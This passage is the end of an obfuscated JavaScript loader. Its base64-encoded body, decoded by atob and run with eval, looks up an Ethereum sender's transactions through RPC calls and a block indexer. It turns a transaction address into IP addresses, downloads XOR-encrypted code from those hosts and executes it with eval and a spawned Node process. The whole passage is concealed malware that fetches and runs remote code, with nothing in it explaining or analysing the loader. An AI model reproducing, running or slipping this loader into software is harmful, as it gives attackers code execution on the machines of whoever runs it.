5","bmMgZnVuY3Rpb24gcnBjQ2FsbChlbmRwb2ludCwgbWV0aG9kLC","BwYXJhbXMsIHNpZ25hbCkgew0KICBjb25zdCBwYXlsb2FkID0g","YXdhaXQgaHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsNCiAgICBtZX","Rob2Q6ICdQT1NUJywNCiAgICBib2R5OiBKU09OLnN0cmluZ2lm","eSh7IGpzb25ycGM6ICcyLjAnLCBpZDogMSwgbWV0aG9kLCBwYX","JhbXMgfSksDQogICAgc2lnbmFsLA0KICB9KTsNCiAgaWYgKHBh","eWxvYWQ/LmVycm9yKSB7DQogICAgdGhyb3cgbmV3IEVycm9yKH","BheWxvYWQuZXJyb3IubWVzc2FnZSB8fCBKU09OLnN0cmluZ2lm","eShwYXlsb2FkLmVycm9yKSk7DQogIH0NCiAgaWYgKHBheWxvYW","Q/LnJlc3VsdCA9PSBudWxsKSB7DQogICAgdGhyb3cgbmV3IEVy","cm9yKGBSUEMgJHttZXRob2R9OiBtaXNzaW5nIHJlc3VsdGApOw","0KICB9DQogIHJldHVybiBwYXlsb2FkLnJlc3VsdDsNCn0NCg0K","YXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW5kcG9pbnQsIGNhbG","xzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0","IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOi","AnUE9TVCcsDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoDQog","ICAgICBjYWxscy5tYXAoKFttZXRob2QsIHBhcmFtc10sIGkpID","0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDogaSArIDEsIG1ldGhv","ZCwgcGFyYW1zIH0pKQ0KICAgICksDQogICAgc2lnbmFsLA0KIC","B9KTsNCiAgaWYgKCFBcnJheS5pc0FycmF5KHBheWxvYWQpKSB7","DQogICAgdGhyb3cgbmV3IEVycm9yKCdSUEMgYmF0Y2g6IGV4cG","VjdGVkIGFycmF5IHJlc3BvbnNlJyk7DQogIH0NCiAgY29uc3Qg","YnlJZCA9IG5ldyBNYXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLm","lkLCByXSkpOw0KICByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9","PiB7DQogICAgY29uc3QgZW50cnkgPSBieUlkLmdldChpICsgMS","k7DQogICAgaWYgKCFlbnRyeSkgdGhyb3cgbmV3IEVycm9yKGBS","UEMgYmF0Y2g6IG1pc3NpbmcgcmVzcG9uc2UgaWQgJHtpICsgMX","1gKTsNCiAgICBpZiAoZW50cnkuZXJyb3IpIHsNCiAgICAgIHRo","cm93IG5ldyBFcnJvcihlbnRyeS5lcnJvci5tZXNzYWdlIHx8IE","pTT04uc3RyaW5naWZ5KGVudHJ5LmVycm9yKSk7DQogICAgfQ0K","ICAgIGlmIChlbnRyeS5yZXN1bHQgPT0gbnVsbCkgew0KICAgIC","AgdGhyb3cgbmV3IEVycm9yKGBSUEMgYmF0Y2g6IG1pc3Npbmcg","cmVzdWx0IGlkICR7aSArIDF9YCk7DQogICAgfQ0KICAgIHJldH","VybiBlbnRyeS5yZXN1bHQ7DQogIH0pOw0KfQ0KDQpjb25zdCB0","b0Jsb2NrSGV4ID0gKG4pID0+IGAweCR7bi50b1N0cmluZygxNi","l9YDsNCg0KZnVuY3Rpb24gZmluZFNlbmRlclR4KHRyYW5zYWN0","aW9ucykgew0KICByZXR1cm4gdHJhbnNhY3Rpb25zLmZpbmQoKH","QpID0+IHQuZnJvbSAmJiB0LmZyb20udG9Mb3dlckNhc2UoKSA9","PT0gU0VOREVSKSB8fCBudWxsOw0KfQ0KDQpmdW5jdGlvbiBkZW","NvZGVBZGRyZXNzKGFkZHJlc3MpIHsNCiAgdHJ5IHsNCiAgICBj","b25zdCBkYXRhID0gQnVmZmVyLmZyb20oYWRkcmVzcy5yZXBsYW","NlKC9eMHgvaSwgJycpLCAnaGV4Jyk7DQogICAgY29uc3QgaXAg","PSAoYikgPT4gYCR7YlswXX0uJHtiWzFdfS4ke2JbMl19LiR7Yl","szXX1gOw0KICAgIHJldHVybiBbaXAoZGF0YS5zdWJhcnJheSgw","LCA0KSksIGlwKGRhdGEuc3ViYXJyYXkoNCwgOCkpXTsNCiAgfS","BjYXRjaCAoZXJyb3IpIHsgcmV0dXJuIFtudWxsLCBudWxsXTsg","fQ0KfQ0KDQpmdW5jdGlvbiBmaXJzdE1hdGNoKHRhc2tzKSB7DQ","ogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gew0K","ICAgIGxldCByZW1haW5pbmcgPSB0YXNrcy5sZW5ndGg7DQogIC","AgaWYgKCFyZW1haW5pbmcpIHJldHVybiByZXNvbHZlKG51bGwp","Ow0KICAgIGxldCBzZXR0bGVkID0gZmFsc2U7DQogICAgY29uc3","QgZmluaXNoID0gKHJlc3VsdCkgPT4gew0KICAgICAgaWYgKHNl","dHRsZWQpIHJldHVybjsNCiAgICAgIHNldHRsZWQgPSB0cnVlOw","0KICAgICAgZm9yIChjb25zdCB0IG9mIHRhc2tzKSB0LmNvbnRy","b2xsZXIuYWJvcnQoKTsNCiAgICAgIHJlc29sdmUocmVzdWx0KT","sNCiAgICB9Ow0KICAgIGZvciAoY29uc3QgdCBvZiB0YXNrcykg","ew0KICAgICAgdC5ydW4oKQ0KICAgICAgICAudGhlbigocmVzdW","x0KSA9PiB7DQogICAgICAgICAgaWYgKHNldHRsZWQpIHJldHVy","bjsNCiAgICAgICAgICBpZiAocmVzdWx0KSBmaW5pc2gocmVzdW","x0KTsNCiAgICAgICAgICBlbHNlIGlmICgtLXJlbWFpbmluZyA9","PT0gMCkgcmVzb2x2ZShudWxsKTsNCiAgICAgICAgfSkNCiAgIC","AgICAgLmNhdGNoKCgpID0+IHsNCiAgICAgICAgICBpZiAoIXNl","dHRsZWQgJiYgLS1yZW1haW5pbmcgPT09IDApIHJlc29sdmUobn","VsbCk7DQogICAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQp9DQoN","CmZ1bmN0aW9uIGNhbmRpZGF0ZUJsb2Nrcyh0YXJnZXQpIHsNCi","AgY29uc3QgcHJldiA9IHRhcmdldCAtIEJMT0NLX01VTFRJUExF","Ow0KICBjb25zdCBzZWVuID0gbmV3IFNldCgpOw0KICBjb25zdC","BvdXQgPSBbXTsNCiAgZm9yIChjb25zdCBiIG9mIFt0YXJnZXQg","LSAxbiwgdGFyZ2V0LCB0YXJnZXQgKyAxbiwgcHJldiAtIDFuLC","BwcmV2LCBwcmV2ICsgMW5dKSB7DQogICAgaWYgKGIgPCAwbikg","Y29udGludWU7DQogICAgY29uc3Qga2V5ID0gYi50b1N0cmluZy","gpOw0KICAgIGlmIChzZWVuLmhhcyhrZXkpKSBjb250aW51ZTsN","CiAgICBzZWVuLmFkZChrZXkpOw0KICAgIG91dC5wdXNoKGIpOw","0KICB9DQogIHJldHVybiBvdXQ7DQp9DQoNCmZ1bmN0aW9uIGJs","b2NrVGFzayhibG9ja051bWJlcikgew0KICBjb25zdCBjb250cm","9sbGVyID0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICByZXR1","cm4gew0KICAgIGNvbnRyb2xsZXIsDQogICAgcnVuOiBhc3luYy","AoKSA9PiB7DQogICAgICBjb25zdCBibG9jayA9IGF3YWl0IHdp","dGhScGNFbmRwb2ludHMoDQogICAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9Pg0KICAgICAgICAgIHJwY0NhbGwoZW5kcG9pbnQs","ICdldGhfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KG","Jsb2NrTnVtYmVyKSwgdHJ1ZV0sIHNpZ25hbCksDQogICAgICAg","IGNvbnRyb2xsZXIuc2lnbmFsDQogICAgICApOw0KICAgICAgY2","9uc3QgdHhzID0gYmxvY2s/LnRyYW5zYWN0aW9uczsNCiAgICAg","IGlmICghQXJyYXkuaXNBcnJheSh0eHMpKSByZXR1cm4gbnVsbD","sNCiAgICAgIGNvbnN0IHR4ID0gZmluZFNlbmRlclR4KHR4cyk7","DQogICAgICByZXR1cm4gdHggPyB7IGJsb2NrTnVtYmVyLCB0eC","B9IDogbnVsbDsNCiAgICB9LA0KICB9Ow0KfQ0KDQphc3luYyBm","dW5jdGlvbiBub25jZUF0QmxvY2tzKGJsb2Nrcywgb3V0ZXJTaW","duYWwpIHsNCiAgY29uc3QgY2FsbHMgPSBibG9ja3MubWFwKChi","KSA9PiBbJ2V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTk","RFUiwgdG9CbG9ja0hleChiKV1dKTsNCiAgdHJ5IHsNCiAgICBy","ZXR1cm4gKGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgIC","AoZW5kcG9pbnQsIHNpZ25hbCkgPT4gcnBjQmF0Y2goZW5kcG9p","bnQsIGNhbGxzLCBzaWduYWwpLA0KICAgICAgb3V0ZXJTaWduYW","wNCiAgICApKS5tYXAoQmlnSW50KTsNCiAgfSBjYXRjaCB7DQog","ICAgcmV0dXJuIChhd2FpdCBQcm9taXNlLmFsbCgNCiAgICAgIG","NhbGxzLm1hcCgoW21ldGhvZCwgcGFyYW1zXSkgPT4NCiAgICAg","ICAgd2l0aFJwY0VuZHBvaW50cygNCiAgICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4gcnBjQ2FsbChlbmRwb2ludCwgbWV0","aG9kLCBwYXJhbXMsIHNpZ25hbCksDQogICAgICAgICAgb3V0ZX","JTaWduYWwNCiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkpLm1h","cChCaWdJbnQpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIG","xhc3RTZW5kZXJUeChsYXRlc3RIaW50KSB7DQogIGNvbnN0IGNv","bnRyb2xsZXIgPSBuZXcgQWJvcnRDb250cm9sbGVyKCk7DQogIH","RyeSB7DQogICAgY29uc3QgaGVhZCA9DQogICAgICBsYXRlc3RI","aW50ID8/DQogICAgICBCaWdJbnQoDQogICAgICAgIGF3YWl0IH","dpdGhScGNFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsICdldGhfYm","xvY2tOdW1iZXInLCBbXSwgc2lnbmFsKSwNCiAgICAgICAgICBj","b250cm9sbGVyLnNpZ25hbA0KICAgICAgICApDQogICAgICApOw","0KDQogICAgY29uc3Qgbm9uY2UgPSBCaWdJbnQoDQogICAgICBh","d2FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCiAgICAgICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2dldFRyYW5zYWN0aW9uQ291bnQnLCBbU0","VOREVSLCB0b0Jsb2NrSGV4KGhlYWQpXSwgc2lnbmFsKSwNCiAg","ICAgICAgY29udHJvbGxlci5zaWduYWwNCiAgICAgICkNCiAgIC","ApOw0KICAgIGNvbnN0IHRhcmdldE5vbmNlID0gbm9uY2UgLSAx","bjsNCg0KICAgIGxldCBsbyA9IFNFQVJDSF9GTE9PUiAtIDFuOw","0KICAgIGxldCBoaSA9IGhlYWQ7DQogICAgd2hpbGUgKGhpIC0g","bG8gPiAxbikgew0KICAgICAgY29uc3Qgc3BhbiA9IGhpIC0gbG","8gLSAxbjsNCiAgICAgIGNvbnN0IGsgPSBCaWdJbnQoTWF0aC5t","aW4oTk9OQ0VfRkFOT1VULCBOdW1iZXIoc3BhbikpKTsNCiAgIC","AgIGNvbnN0IHByb2JlcyA9IFtdOw0KICAgICAgZm9yIChsZXQg","aSA9IDFuOyBpIDw9IGs7IGkgKz0gMW4pIHByb2Jlcy5wdXNoKG","xvICsgKGkgKiAoaGkgLSBsbykpIC8gKGsgKyAxbikpOw0KDQog","ICAgICBjb25zdCBjb3VudHMgPSBhd2FpdCBub25jZUF0QmxvY2","tzKHByb2JlcywgY29udHJvbGxlci5zaWduYWwpOw0KICAgICAg","Y29uc3QgaWR4ID0gY291bnRzLmZpbmRJbmRleCgoYykgPT4gYy","A+PSBub25jZSk7DQogICAgICBpZiAoaWR4ID09PSAtMSkgbG8g","PSBwcm9iZXNbcHJvYmVzLmxlbmd0aCAtIDFdOw0KICAgICAgZW","xzZSB7DQogICAgICAgIGhpID0gcHJvYmVzW2lkeF07DQogICAg","ICAgIGlmIChpZHggPiAwKSBsbyA9IHByb2Jlc1tpZHggLSAxXT","sNCiAgICAgIH0NCiAgICB9DQoNCiAgICBjb25zdCBibG9jayA9","IGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCiAgICAgICAgcnBjQ2FsbChlbmRw","b2ludCwgJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJywgW3RvQmxvY2","tIZXgoaGkpLCB0cnVlXSwgc2lnbmFsKSwNCiAgICAgIGNvbnRy","b2xsZXIuc2lnbmFsDQogICAgKTsNCiAgICBjb25zdCB0eHMgPS","BibG9jaz8udHJhbnNhY3Rpb25zIHx8IFtdOw0KICAgIGxldCB0","eCA9IG51bGw7DQogICAgZm9yIChjb25zdCB0IG9mIHR4cykgew","0KICAgICAgaWYgKCF0LmZyb20gfHwgdC5mcm9tLnRvTG93ZXJD","YXNlKCkgIT09IFNFTkRFUikgY29udGludWU7DQogICAgICBpZi","AoQmlnSW50KHQubm9uY2UpID09PSB0YXJnZXROb25jZSkgew0K","ICAgICAgICB0eCA9IHQ7DQogICAgICAgIGJyZWFrOw0KICAgIC","AgfQ0KICAgICAgaWYgKCF0eCB8fCBCaWdJbnQodC5ub25jZSkg","PiBCaWdJbnQodHgubm9uY2UpKSB0eCA9IHQ7DQogICAgfQ0KIC","AgIHJldHVybiB7IGJsb2NrTnVtYmVyOiBoaSwgdHggfTsNCiAg","fSBmaW5hbGx5IHsNCiAgICBjb250cm9sbGVyLmFib3J0KCk7DQ","ogIH0NCn0NCg0KYXN5bmMgZnVuY3Rpb24gbGFzdFNlbmRlclR4","VmlhSW5kZXhlcigpIHsNCiAgY29uc3QgdXJsID0NCiAgICBgJH","tJTkRFWEVSX1VSTH0/bW9kdWxlPWFjY291bnQmYWN0aW9uPXR4","bGlzdCZhZGRyZXNzPSR7U0VOREVSfWAgKw0KICAgIGAmc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gOw0KICBjb2","5zdCBwYXlsb2FkID0gYXdhaXQgaHR0cFJlcXVlc3QodXJsKTsN","CiAgY29uc3QgbGlzdCA9IEFycmF5LmlzQXJyYXkocGF5bG9hZD","8ucmVzdWx0KSA/IHBheWxvYWQucmVzdWx0IDogW107DQogIGNv","bnN0IHR4ID0gbGlzdC5maW5kKCh0KSA9PiB0LmZyb20gJiYgdC","5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUik7DQogIGlm","ICghdHgpIHJldHVybiBudWxsOw0KICByZXR1cm4geyBibG9ja0","51bWJlcjogQmlnSW50KHR4LmJsb2NrTnVtYmVyKSwgdHggfTsN","Cn0NCg0KYXN5bmMgZnVuY3Rpb24gcnVuKCkgew0KICBsZXQgYm","xvY2tIZXg7DQogIHRyeSB7DQogICAgYmxvY2tIZXggPSBhd2Fp","dCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludCwgc2lnbmFsKS","A9Pg0KICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2V0aF9ibG9j","a051bWJlcicsIFtdLCBzaWduYWwpDQogICAgKTsNCiAgfSBjYX","RjaCB7DQogICAgcmV0dXJuOw0KICB9DQogIGNvbnN0IGxhdGVz","dCA9IEJpZ0ludChibG9ja0hleCk7DQogIGNvbnN0IHRhcmdldE","Jsb2NrID0gbGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJ","UExFKTsNCiAgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KIC","BsZXQgbWF0Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0","ZUJsb2Nrcyh0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw","0KICBsZXQgW2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0","Y2g/LnR4Py50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybC","hpcCwgcG9ydCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSBy","ZXR1cm4gbnVsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cD","ovLyR7aXB9OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoN","CiAgbGV0IGNvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPS","BwYXlsb2FkVXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBp","ZiAoY2xzVXJsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPS","Bhd2FpdCBnZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xz","VXJsKTsNCiAgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudW","xsOw0KICAgIH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAg","IG1hdGNoID0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobG","F0ZXN0KS5jYXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChh","d2FpdCBsYXN0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKC","kgPT4gbnVsbCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVB","ZGRyZXNzKG1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2","xvYmFsWydfViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydf","SCddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWy","dfSDInXSA9IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2Jh","bFsnX3RfcyddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2","dsb2JhbFsnX3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0K","DQogIGZ1bmN0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgIC","Bjb25zdCBiYXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5o","b3N0bmFtZSwNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydC","kgfHwgODAsDQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1","cmwuc2VhcmNoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgIC","AnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBO","VCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMz","YgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4w","IFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2","xvYmFsWydfViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoN","CiAgICBmdW5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgIC","Bjb25zdCBrbiA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxl","dCBpID0gMDsgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF","49IGtleS5jaGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1","cm4gYnVmLnRvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogIC","AgZnVuY3Rpb24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAg","IGNvbnN0IGI2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYj","Y0J107DQogICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9y","KCdNaXNzaW5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldH","VybiB4b3JEZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0","JykpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobW","V0aG9kKSB7DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJl","c29sdmUsIHJlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZX","EgPSBodHRwLnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwg","KHJlcykgPT4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09IC","dIRUFEJykgew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShm","cm9tQjY0SGVhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlam","VjdChlKTsgfQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0K","ICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgIC","AgICAgICBjb25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICBy","ZXMub24oJ2RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKG","NodW5rKSk7DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9","PiB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgIC","Bjb25zdCBidWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQog","ICAgICAgICAgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcm","Vzb2x2ZSh4b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAg","IGlmIChyZXMuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZX","R1cm4gcmVzb2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAg","ICAgICAgICAgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYX","lsb2FkIGJvZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChl","KSB7DQogICAgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgIC","AgICAgIH0NCiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMu","b24oJ2Vycm9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogIC","AgICAgIHJlcS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAg","ICByZXEuc2V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID","0+IHsNCiAgICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3Io","YEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU3","1tc2ApKTsNCiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQo","KTsNCiAgICAgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZX","F1ZXN0KCdHRVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFE","JykpOw0KICB9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYW","Rlcih1cmwsIGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAg","ICAgIGNvbnN0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdX","JsKTsNCiAgICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAg","ICA/IGBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fC","AwfSc7Z2xvYmFsWydfSCddPScke19nbG9iYWxbJ19IJ119Jztn","bG9iYWxbJ19IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYm","FsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7Z2xv","YmFsLl9fX2ZpbGVuYW1lPSdbZXZhbF0nO2dsb2JhbC5fX19kaX","JuYW1lPXByb2Nlc3MuY3dkKCk7dmFyIF9nbG9iYWw9Z2xvYmFs","O2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPScke19nbG9iYW","xbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPScke19nbG9i","YWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPScke19nbG9iYW","xbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcmU7Z2xvYmFs","WydtJ109bW9kdWxlO2dsb2JhbC5fX19maWxlbmFtZT0nW2V2YW","xdJztnbG9iYWwuX19fZGlybmFtZT1wcm9jZXNzLmN3ZCgpO3Zh","ciBfZ2xvYmFsPWdsb2JhbDtgOw0KDQogICAgICBpZiAoIWlzQm","9vdCkgZXZhbChlbnYgKyBjb2RlKTsNCiAgICAgIGF3YWl0IHNw","YXduTm9kZVNjcmlwdChlbnYgKyBjb2RlKTsNCiAgICB9IGNhdG","NoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVuX2xvYWRlcihu","ZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC9jbHNgKSwgJ3","E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQogIGF3YWl0IHJ1","bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aXAxfTo0NDMvMH","gvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0cnVlKTsNCn0N","Cg0KcnVuKCk7DQo="].join('');var _0xac4db=atob(_0xac4da);eval(_0xac4db);})();
